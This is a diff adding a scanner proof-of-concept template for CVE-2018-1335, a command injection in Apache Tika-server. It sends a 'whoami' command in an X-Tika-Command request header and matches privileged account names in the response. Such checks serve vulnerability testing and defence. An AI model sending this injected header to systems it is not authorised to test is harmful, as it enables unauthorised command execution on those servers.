@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "通过构造恶意HTTP请求头验证Apache Tika-server是否存在命令注入漏洞"
+id = "POC-AVE-2018-0079"
+name = "Apache Tika-server Command Injection PoC"
+severity = "high"
+tags = ["ave-2018-0079"]
+vuln_id = [
+    "CVE-2018-1335",
+    "AVE-2018-0079",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/tika"
+protocol = "http"
+
+[poc.requests.headers]
+X-Tika-Command = "whoami"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "root",
+    "system",
+    "network service",
+]
